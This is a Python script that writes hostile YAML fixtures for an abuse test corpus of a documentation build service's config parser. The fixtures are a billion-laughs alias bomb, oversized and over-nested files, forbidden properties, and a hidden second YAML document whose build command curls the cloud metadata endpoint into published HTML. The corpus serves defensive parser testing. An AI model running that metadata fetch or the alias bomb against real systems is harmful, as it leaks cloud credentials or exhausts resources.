#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Emit the hostile .docup.yaml fixtures for the abuse corpus (SPEC 8.4.9).

SPEC 8.4.9 parses configuration OUTSIDE any sandbox, so the parser itself is an
attack surface reachable from any connected repository. The caps are hard:
<=256 KiB, nesting depth <=32, YAML aliases disabled, single document.

Usage:  python build_configs.py [outdir]
"""
import os
import sys

OUT = sys.argv[1] if len(sys.argv) > 1 else os.path.join(
    os.path.dirname(os.path.abspath(__file__)), '..', '_generated', 'configs')


def yaml_billion_laughs():
    """Alias expansion bomb. Nine levels of tenfold expansion = 10^9 nodes.

    This is why SPEC 8.4.9 disables aliases outright rather than bounding them:
    a bound still has to be chosen, and any bound above 1 is exploitable.
    """
    lines = ['version: 2', 'a0: &a0 "docup"']
    for i in range(1, 10):
        prev = '*a%d' % (i - 1)
        lines.append('a%d: &a%d [%s]' % (i, i, ', '.join([prev] * 10)))
    lines.append('build:')
    lines.append('  os: ubuntu-24.04')
    lines.append('  tools: {python: "3.12"}')
    lines.append('boom: *a9')
    return '\n'.join(lines) + '\n'


def yaml_depth_40():
    """40 levels of nesting against a documented limit of 32."""
    out = ['version: 2']
    for i in range(40):
        out.append('  ' * i + 'k%d:' % i)
    out.append('  ' * 40 + 'leaf: true')
    return '\n'.join(out) + '\n'


def yaml_256kb_plus():
    """~300 KiB against a documented cap of 256 KiB."""
    filler = 'x' * 96
    lines = ['version: 2', 'build:', '  os: ubuntu-24.04', '  tools: {python: "3.12"}', 'padding:']
    # each entry is ~110 bytes; 2800 entries clears 300 KiB
    for i in range(2800):
        lines.append('  - "%06d %s"' % (i, filler))
    return '\n'.join(lines) + '\n'


def yaml_multi_document():
    """Two documents in one stream. A parser reading only the first would miss
    the second, so a reviewer and the builder could disagree about the config."""
    return (
        'version: 2\n'
        'build:\n'
        '  os: ubuntu-24.04\n'
        '  tools: {python: "3.12"}\n'
        'mkdocs:\n'
        '  configuration: mkdocs.yml\n'
        '---\n'
        'version: 2\n'
        'build:\n'
        '  commands:\n'
        '    - curl http://169.254.169.254/latest/meta-data/ -o $DOCUP_OUTPUT/html/index.html\n'
    )


def unknown_property_project():
    """SPEC 8.4.8: the config file may never name a project."""
    return 'version: 2\nproject: other-tenant\nmkdocs:\n  configuration: mkdocs.yml\n'


def unknown_property_visibility():
    """SPEC 8.4.8: nor visibility - repository content is attacker-controlled."""
    return 'version: 2\nvisibility: public\nmkdocs:\n  configuration: mkdocs.yml\n'


BUILDERS = [yaml_billion_laughs, yaml_depth_40, yaml_256kb_plus,
            yaml_multi_document, unknown_property_project,
            unknown_property_visibility]


def main():
    os.makedirs(OUT, exist_ok=True)
    for b in BUILDERS:
        path = os.path.join(OUT, b.__name__ + '.yaml')
        data = b()
        with open(path, 'w', encoding='utf-8', newline='\n') as fh:
            fh.write(data)
        first = (b.__doc__ or '').strip().split('\n')[0]
        print('%-32s %8d bytes  %s' % (b.__name__, len(data), first))
    print('\n%d configs written to %s' % (len(BUILDERS), os.path.abspath(OUT)))
    print('NOTE: yaml_billion_laughs must never be handed to a YAML loader with')
    print('aliases enabled, including in a test harness. It exists to prove the')
    print('loader is configured with aliases OFF before it is ever called.')


if __name__ == '__main__':
    main()
